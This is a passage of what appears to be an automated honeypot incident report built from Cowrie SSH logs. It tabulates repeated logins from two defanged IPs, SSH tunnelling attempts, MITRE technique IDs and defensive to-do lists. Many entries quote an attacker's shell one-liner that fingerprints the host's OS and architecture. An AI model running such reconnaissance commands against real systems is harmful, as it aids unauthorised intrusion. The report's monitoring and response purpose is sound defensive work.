| `2026-09-01 22:11:56` | `cowrie.session.params` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.success` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.command.input` |
| `2026-09-01 22:11:56` | `cowrie.log.closed` |
| `2026-09-01 22:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e3ba12b30e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:11 |
| **Last Seen** | 2026-09-01 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:11:45` | `cowrie.session.connect` |
| `2026-09-01 22:11:45` | `cowrie.client.version` |
| `2026-09-01 22:11:46` | `cowrie.client.kex` |
| `2026-09-01 22:11:46` | `cowrie.login.success` |
| `2026-09-01 22:11:47` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:11:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:11:47` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411d457c645e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:13 |
| **Last Seen** | 2026-09-01 22:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:13:14` | `cowrie.session.connect` |
| `2026-09-01 22:13:15` | `cowrie.client.version` |
| `2026-09-01 22:13:15` | `cowrie.client.kex` |
| `2026-09-01 22:13:22` | `cowrie.login.success` |
| `2026-09-01 22:13:24` | `cowrie.session.params` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.success` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.command.input` |
| `2026-09-01 22:13:24` | `cowrie.log.closed` |
| `2026-09-01 22:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd91a3e084d3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:14 |
| **Last Seen** | 2026-09-01 22:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:14:06` | `cowrie.session.connect` |
| `2026-09-01 22:14:06` | `cowrie.client.version` |
| `2026-09-01 22:14:06` | `cowrie.client.kex` |
| `2026-09-01 22:14:07` | `cowrie.login.success` |
| `2026-09-01 22:14:07` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:14:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:14:08` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4789bc3d5a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:14 |
| **Last Seen** | 2026-09-01 22:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:14:37` | `cowrie.session.connect` |
| `2026-09-01 22:14:39` | `cowrie.client.version` |
| `2026-09-01 22:14:39` | `cowrie.client.kex` |
| `2026-09-01 22:14:46` | `cowrie.login.success` |
| `2026-09-01 22:14:49` | `cowrie.session.params` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.success` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.command.input` |
| `2026-09-01 22:14:49` | `cowrie.log.closed` |
| `2026-09-01 22:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee14b8d0718

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:15 |
| **Last Seen** | 2026-09-01 22:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:15:59` | `cowrie.session.connect` |
| `2026-09-01 22:16:00` | `cowrie.client.version` |
| `2026-09-01 22:16:00` | `cowrie.client.kex` |
| `2026-09-01 22:16:08` | `cowrie.login.success` |
| `2026-09-01 22:16:10` | `cowrie.session.params` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.success` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.command.input` |
| `2026-09-01 22:16:10` | `cowrie.log.closed` |
| `2026-09-01 22:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6229fb9d29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:17 |
| **Last Seen** | 2026-09-01 22:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:17:20` | `cowrie.session.connect` |
| `2026-09-01 22:17:21` | `cowrie.client.version` |
| `2026-09-01 22:17:21` | `cowrie.client.kex` |
| `2026-09-01 22:17:28` | `cowrie.login.success` |
| `2026-09-01 22:17:30` | `cowrie.session.params` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.success` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:30` | `cowrie.command.input` |
| `2026-09-01 22:17:31` | `cowrie.log.closed` |
| `2026-09-01 22:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f98365d746

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:18 |
| **Last Seen** | 2026-09-01 22:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:18:40` | `cowrie.session.connect` |
| `2026-09-01 22:18:42` | `cowrie.client.version` |
| `2026-09-01 22:18:42` | `cowrie.client.kex` |
| `2026-09-01 22:18:49` | `cowrie.login.success` |
| `2026-09-01 22:18:51` | `cowrie.session.params` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.success` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:51` | `cowrie.command.input` |
| `2026-09-01 22:18:52` | `cowrie.log.closed` |
| `2026-09-01 22:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549b4e96c8a3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:19 |
| **Last Seen** | 2026-09-01 22:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:19:59` | `cowrie.session.connect` |
| `2026-09-01 22:20:00` | `cowrie.client.version` |
| `2026-09-01 22:20:00` | `cowrie.client.kex` |
| `2026-09-01 22:20:07` | `cowrie.login.success` |
| `2026-09-01 22:20:09` | `cowrie.session.params` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.success` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.command.input` |
| `2026-09-01 22:20:09` | `cowrie.log.closed` |
| `2026-09-01 22:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac23fd61ee76

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:21 |
| **Last Seen** | 2026-09-01 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:21:06` | `cowrie.session.connect` |
| `2026-09-01 22:21:06` | `cowrie.client.version` |
| `2026-09-01 22:21:06` | `cowrie.client.kex` |
| `2026-09-01 22:21:07` | `cowrie.login.success` |
| `2026-09-01 22:21:07` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:21:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:21:08` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b56b7ad19e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:21 |
| **Last Seen** | 2026-09-01 22:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:21:18` | `cowrie.session.connect` |
| `2026-09-01 22:21:20` | `cowrie.client.version` |
| `2026-09-01 22:21:20` | `cowrie.client.kex` |
| `2026-09-01 22:21:27` | `cowrie.login.success` |
| `2026-09-01 22:21:29` | `cowrie.session.params` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.success` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.command.input` |
| `2026-09-01 22:21:29` | `cowrie.log.closed` |
| `2026-09-01 22:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8417f8158d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:22 |
| **Last Seen** | 2026-09-01 22:22 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:22:41` | `cowrie.session.connect` |
| `2026-09-01 22:22:43` | `cowrie.client.version` |
| `2026-09-01 22:22:43` | `cowrie.client.kex` |
| `2026-09-01 22:22:51` | `cowrie.login.success` |
| `2026-09-01 22:22:52` | `cowrie.session.params` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.success` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:52` | `cowrie.command.input` |
| `2026-09-01 22:22:53` | `cowrie.log.closed` |
| `2026-09-01 22:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b23d28c3056

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:24 |
| **Last Seen** | 2026-09-01 22:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:24:09` | `cowrie.session.connect` |
| `2026-09-01 22:24:11` | `cowrie.client.version` |
| `2026-09-01 22:24:11` | `cowrie.client.kex` |
| `2026-09-01 22:24:18` | `cowrie.login.success` |
| `2026-09-01 22:24:20` | `cowrie.session.params` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.success` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:20` | `cowrie.command.input` |
| `2026-09-01 22:24:21` | `cowrie.log.closed` |
| `2026-09-01 22:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5a976b443a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:24 |
| **Last Seen** | 2026-09-01 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:24:59` | `cowrie.session.connect` |
| `2026-09-01 22:24:59` | `cowrie.client.version` |
| `2026-09-01 22:25:00` | `cowrie.client.kex` |
| `2026-09-01 22:25:00` | `cowrie.login.success` |
| `2026-09-01 22:25:01` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:25:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:25:01` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf50a111fdf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:25 |
| **Last Seen** | 2026-09-01 22:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:25:39` | `cowrie.session.connect` |
| `2026-09-01 22:25:41` | `cowrie.client.version` |
